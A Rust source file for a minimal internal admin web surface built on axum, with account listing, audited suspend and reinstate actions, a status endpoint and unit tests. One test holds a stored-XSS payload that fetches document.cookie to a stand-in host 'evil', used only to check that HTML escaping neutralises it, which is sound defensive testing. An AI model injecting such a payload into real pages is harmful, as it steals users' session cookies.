//! The internal admin surface (docs/17 §Admin surface, M17.7).
//!
//! > "`panday-platform` serves a minimal internal admin (accounts, grants, refunds, kill-switch per
//! > key) — HTML, boring, behind IdP."
//!
//! **HTML, and boring on purpose.** No JavaScript, no build step, no framework: this is a page an
//! operator opens at 3am on whatever browser is on the machine they are logged into. A single-page
//! app with a build pipeline is a thing that can be broken by a dependency the day you need it.
//!
//! **Behind an `admin`-scoped key, not yet behind an IdP.** docs/17 asks for an IdP and this repo
//! has none to integrate with; the scope check is the honest interim, and it is a real control
//! rather than a placeholder — an admin key is minted deliberately, is revocable in one command,
//! and its id lands in every audit row so "who did this" has an answer. The seam is one function.
//!
//! **Every mutating action is audited in the same transaction as its effect.** An admin surface
//! that can act without leaving a trace is indistinguishable from an intrusion.

use crate::abuse;
use axum::extract::{Path, State};
use axum::http::{HeaderMap, StatusCode};
use axum::response::{Html, IntoResponse, Redirect, Response};
use axum::routing::{get, post};
use axum::Router;
use sqlx::PgPool;
use std::sync::Arc;
use uuid::Uuid;

#[derive(Clone)]
pub struct AdminState {
    pub pool: PgPool,
    pub auth: Arc<dyn panday_gateway::ingress::Authenticator>,
}

pub fn router(state: AdminState) -> Router {
    Router::new()
        .route("/admin", get(index))
        // Unauthenticated on purpose, and content-free: a status page that needs a key is one no
        // uptime checker can read, and one that leaks account counts is a business metric on a
        // public URL (docs/22 M22.3).
        .route("/status", get(status))
        .route("/admin/accounts/{id}", get(account))
        .route("/admin/accounts/{id}/suspend", post(suspend))
        .route("/admin/accounts/{id}/unsuspend", post(unsuspend))
        .with_state(state)
}

/// The admin key behind this request, or a 401 page.
///
/// Returns the key id rather than a boolean, because every audit row needs an actor and taking it
/// from the request is the only way it cannot be wrong.
async fn actor(state: &AdminState, headers: &HeaderMap) -> Result<String, Response> {
    let bearer = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .unwrap_or("")
        .trim();

    match state.auth.authenticate(bearer).await {
        Ok(caller) if caller.allows("admin") => Ok(caller.key_id),
        // One refusal for both cases. A key without `admin` learning that it authenticated
        // successfully is a key learning it is close.
        _ => Err((
            StatusCode::UNAUTHORIZED,
            page(
                "not authorised",
                "<p>An <code>admin</code>-scoped key is required.</p>",
            ),
        )
            .into_response()),
    }
}

/// One table per migration that creates one, which is what `/status` means by "the schema this
/// binary carries". Not every table: `plans`, `subscriptions`, `credit_grants` and `meter_exports`
/// ship in the same migrations as their neighbours, and naming them would make this list longer
/// without making it detect anything the neighbour does not.
///
/// Adding a migration that creates a table means adding it here **and** to [`SCHEMA_PROBE`];
/// `the_schema_probe_and_the_expected_list_cannot_drift` fails if only one of them moves.
const EXPECTED_TABLES: &[&str] = &[
    "accounts",
    "ledger_entries",
    "api_keys",
    "balances",
    "route_decisions",
    "session_events",
    "billing_events",
    "admin_actions",
    "credentials",
];

/// Kept as one literal rather than built from [`EXPECTED_TABLES`] because `tenancy.rs`'s M20.3 lint
/// reads SQL out of string literals; a query assembled at runtime is a query the lint cannot see.
const SCHEMA_PROBE: &str =
    "-- tenant-scoping: cross-tenant — a schema check is about the deployment, not an account.
         SELECT count(*)::bigint FROM information_schema.tables
         WHERE table_schema = 'public' AND table_name IN
           ('accounts','ledger_entries','api_keys','balances','route_decisions',
            'session_events','billing_events','admin_actions','credentials')";

/// `GET /status` — is this deployment healthy?
///
/// Three facts and nothing else: the build, whether the database answers, and whether the schema is
/// the one this binary carries. The last is the one that matters after a deploy — a binary rolled
/// without its migrations passes every other check and then fails on the first query against a
/// column that does not exist.
///
/// Returns 503 when unhealthy, because a status page that answers 200 with the word "degraded" in
/// the body is a status page every uptime checker reports as up.
async fn status(State(state): State<AdminState>) -> Response {
    let database = sqlx::query_scalar::<_, i32>("SELECT 1")
        .fetch_one(&state.pool)
        .await
        .is_ok();

    let migrations = match sqlx::query_scalar::<_, i64>(SCHEMA_PROBE)
        .fetch_one(&state.pool)
        .await
    {
        Ok(n) => n as usize,
        Err(_) => 0,
    };
    // Derived from the list, never written as a number beside it. A hand-kept threshold and a
    // hand-kept name list drift the moment one is edited and the other is not — which is exactly
    // what happened when M25.11 raised this to 9 without adding `credentials` to the probe, making
    // `schema_ok` unsatisfiable and every `/status` a 503.
    let schema_ok = migrations >= EXPECTED_TABLES.len();

    let healthy = database && schema_ok;
    let body = serde_json::json!({
        "status": if healthy { "ok" } else { "degraded" },
        "version": env!("CARGO_PKG_VERSION"),
        "database": database,
        "schema": schema_ok,
    });

    let code = if healthy {
        StatusCode::OK
    } else {
        StatusCode::SERVICE_UNAVAILABLE
    };
    (code, axum::Json(body)).into_response()
}

async fn index(State(state): State<AdminState>, headers: HeaderMap) -> Response {
    let _actor = match actor(&state, &headers).await {
        Ok(a) => a,
        Err(response) => return response,
    };

    let rows: Vec<(Uuid, String, Option<time::OffsetDateTime>)> = match sqlx::query_as(
        "-- tenant-scoping: cross-tenant — the admin list is the operator's view of every account;
         -- it is reachable only with an `admin`-scoped key and every action from it is audited.
         SELECT account_id, name, suspended_at FROM accounts ORDER BY created_at DESC LIMIT 200",
    )
    .fetch_all(&state.pool)
    .await
    {
        Ok(rows) => rows,
        Err(e) => return error_page(&e.to_string()),
    };

    let mut body = String::from("<table><tr><th>account</th><th>name</th><th>state</th></tr>");
    for (id, name, suspended) in rows {
        body.push_str(&format!(
            "<tr><td><a href=\"/admin/accounts/{id}\">{}</a></td><td>{}</td><td>{}</td></tr>",
            short(&id.to_string()),
            escape(&name),
            if suspended.is_some() {
                "SUSPENDED"
            } else {
                "active"
            }
        ));
    }
    body.push_str("</table>");
    Html(page("accounts", &body)).into_response()
}

async fn account(
    State(state): State<AdminState>,
    headers: HeaderMap,
    Path(id): Path<String>,
) -> Response {
    if let Err(response) = actor(&state, &headers).await {
        return response;
    }
    let Ok(account_id) = id.parse::<Uuid>() else {
        return error_page("not an account id");
    };

    let suspension = match abuse::suspension(&state.pool, account_id).await {
        Ok(s) => s,
        Err(e) => return error_page(&e.to_string()),
    };
    let balance = crate::pg::balance_micros(&state.pool, account_id)
        .await
        .unwrap_or(0);
    let keys = crate::keys::list(&state.pool, account_id)
        .await
        .unwrap_or_default();
    let history = abuse::history(&state.pool, account_id, 20)
        .await
        .unwrap_or_default();
    let spend_24h = abuse::spend_micros(&state.pool, account_id, 24)
        .await
        .unwrap_or(0);

    let mut body = format!(
        "<h2>{}</h2><p>balance ${:.2} · spent ${:.2} in 24h</p>",
        escape(&id),
        balance as f64 / 1e6,
        spend_24h as f64 / 1e6
    );

    body.push_str(&match &suspension {
        Some(reason) => format!(
            "<p class=\"bad\">SUSPENDED — {}</p>\
             <form method=\"post\" action=\"/admin/accounts/{id}/unsuspend\">\
             <button>reinstate</button></form>",
            escape(reason)
        ),
        None => format!(
            "<form method=\"post\" action=\"/admin/accounts/{id}/suspend\">\
             <input name=\"reason\" placeholder=\"why\" required>\
             <button>suspend</button></form>"
        ),
    });

    body.push_str(
        "<h3>keys</h3><table><tr><th>name</th><th>scopes</th><th>state</th><th>last used</th></tr>",
    );
    for key in keys {
        body.push_str(&format!(
            "<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td></tr>",
            escape(&key.name),
            escape(
                &key.scopes
                    .iter()
                    .map(|s| s.as_str())
                    .collect::<Vec<_>>()
                    .join(",")
            ),
            if key.revoked { "revoked" } else { "active" },
            escape(key.last_used_at.as_deref().unwrap_or("never"))
        ));
    }
    body.push_str("</table>");

    body.push_str(
        "<h3>admin history</h3><table><tr><th>action</th><th>actor</th><th>reason</th></tr>",
    );
    for (action, actor, reason) in history {
        body.push_str(&format!(
            "<tr><td>{}</td><td>{}</td><td>{}</td></tr>",
            escape(&action),
            escape(&short(&actor)),
            escape(reason.as_deref().unwrap_or(""))
        ));
    }
    body.push_str("</table>");

    Html(page("account", &body)).into_response()
}

async fn suspend(
    State(state): State<AdminState>,
    headers: HeaderMap,
    Path(id): Path<String>,
    body: String,
) -> Response {
    let actor = match actor(&state, &headers).await {
        Ok(a) => a,
        Err(response) => return response,
    };
    let Ok(account_id) = id.parse::<Uuid>() else {
        return error_page("not an account id");
    };

    // A reason is required by the form and re-checked here: a kill switch with no reason recorded
    // is one nobody can review, and a form field is not a control.
    let reason = form_field(&body, "reason").unwrap_or_default();
    if reason.trim().is_empty() {
        return error_page("a suspension needs a reason");
    }

    match abuse::suspend(&state.pool, account_id, &actor, &reason).await {
        Ok(()) => Redirect::to(&format!("/admin/accounts/{id}")).into_response(),
        Err(e) => error_page(&e.to_string()),
    }
}

async fn unsuspend(
    State(state): State<AdminState>,
    headers: HeaderMap,
    Path(id): Path<String>,
) -> Response {
    let actor = match actor(&state, &headers).await {
        Ok(a) => a,
        Err(response) => return response,
    };
    let Ok(account_id) = id.parse::<Uuid>() else {
        return error_page("not an account id");
    };
    match abuse::unsuspend(&state.pool, account_id, &actor).await {
        Ok(()) => Redirect::to(&format!("/admin/accounts/{id}")).into_response(),
        Err(e) => error_page(&e.to_string()),
    }
}

/// One field out of an `application/x-www-form-urlencoded` body.
///
/// Hand-decoded because the whole form is one text field, and because the alternative is a
/// dependency for the smallest possible parse. Handles the two escapes a browser actually sends.
pub fn form_field(body: &str, name: &str) -> Option<String> {
    body.split('&')
        .filter_map(|pair| pair.split_once('='))
        .find(|(k, _)| *k == name)
        .map(|(_, v)| percent_decode(&v.replace('+', " ")))
}

fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(byte) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(byte);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).to_string()
}

/// HTML-escape. Every value on these pages came from a customer, and an admin page that renders a
/// customer-chosen account name unescaped is a stored XSS aimed at the one session with admin
/// scope.
pub fn escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}

fn short(id: &str) -> String {
    id.chars().take(8).collect()
}

fn error_page(message: &str) -> Response {
    (
        StatusCode::BAD_REQUEST,
        Html(page(
            "error",
            &format!("<p class=\"bad\">{}</p>", escape(message)),
        )),
    )
        .into_response()
}

/// The whole stylesheet. Inline, because a separate asset is a second request that can 404 and a
/// build step that can rot.
fn page(title: &str, body: &str) -> String {
    format!(
        "<!doctype html><meta charset=\"utf-8\"><title>panday admin — {title}</title>\
         <style>body{{font:14px/1.5 system-ui,sans-serif;margin:2rem;max-width:60rem}}\
         table{{border-collapse:collapse;width:100%;margin:1rem 0}}\
         th,td{{text-align:left;padding:.3rem .6rem;border-bottom:1px solid #ddd}}\
         .bad{{color:#a00;font-weight:600}} a{{color:#06c}} \
         button{{padding:.3rem .8rem}} input{{padding:.3rem}}</style>\
         <h1><a href=\"/admin\">panday admin</a> — {title}</h1>{body}"
    )
}

#[cfg(test)]
mod tests {
    use super::{EXPECTED_TABLES, SCHEMA_PROBE};

    #[test]
    fn the_schema_probe_and_the_expected_list_cannot_drift() {
        // The bug this exists for: M25.11 raised the threshold to 9 while the probe still named
        // eight tables, so `count(*)` could never reach it. `schema_ok` was permanently false and
        // `/status` answered 503 on a perfectly healthy deployment — a status page that always
        // says "degraded" is one nobody can use to tell whether anything is wrong.
        //
        // Nothing caught it: the only `/status` test is in the smoke suite, needs a running
        // deployment, and accepts `200 || 503`.
        for table in EXPECTED_TABLES {
            assert!(
                SCHEMA_PROBE.contains(&format!("'{table}'")),
                "`{table}` is expected but the probe never asks for it, so it can never be counted"
            );
        }
        // Only the `IN (...)` list — `table_schema = 'public'` is a quoted literal too, and
        // counting every quote pair in the statement made this assertion off by one.
        let in_list = SCHEMA_PROBE
            .split_once("IN\n")
            .or_else(|| SCHEMA_PROBE.split_once("IN ("))
            .expect("the probe filters on an IN list")
            .1;
        let asked_for = in_list.matches('\'').count() / 2;
        assert_eq!(
            asked_for,
            EXPECTED_TABLES.len(),
            "the probe asks for {asked_for} tables and {} are expected — a threshold the query \
             cannot reach makes /status permanently degraded",
            EXPECTED_TABLES.len()
        );
    }

    #[test]
    fn every_migration_that_creates_a_table_is_represented() {
        // A migration adding a table its own binary does not check for is a binary that reports a
        // healthy schema it never verified. One name per migration is enough; naming every table
        // would not detect anything a neighbour in the same file does not.
        for (name, sql) in crate::pg::EMBEDDED_MIGRATIONS {
            let creates: Vec<String> = sql
                .to_lowercase()
                .replace("create unlogged table", "create table")
                .split("create table if not exists")
                .skip(1)
                .filter_map(|rest| rest.split_whitespace().next().map(str::to_string))
                .collect();
            if creates.is_empty() {
                continue;
            }
            assert!(
                creates
                    .iter()
                    .any(|t| EXPECTED_TABLES.contains(&t.as_str())),
                "{name} creates {creates:?} and /status checks for none of them"
            );
        }
    }

    use super::*;

    #[test]
    fn a_customer_chosen_name_cannot_inject_script_into_the_admin_page() {
        // The one session with admin scope is exactly what a stored XSS wants.
        let nasty = "<script>fetch('//evil/'+document.cookie)</script>";
        let escaped = escape(nasty);
        assert!(!escaped.contains("<script"));
        assert!(escaped.contains("&lt;script&gt;"));
    }

    #[test]
    fn a_form_field_survives_the_encoding_a_browser_actually_sends() {
        assert_eq!(
            form_field("reason=card+testing+%26+refunds", "reason").as_deref(),
            Some("card testing & refunds")
        );
        assert_eq!(form_field("other=x", "reason"), None);
        assert_eq!(form_field("", "reason"), None);
    }
}
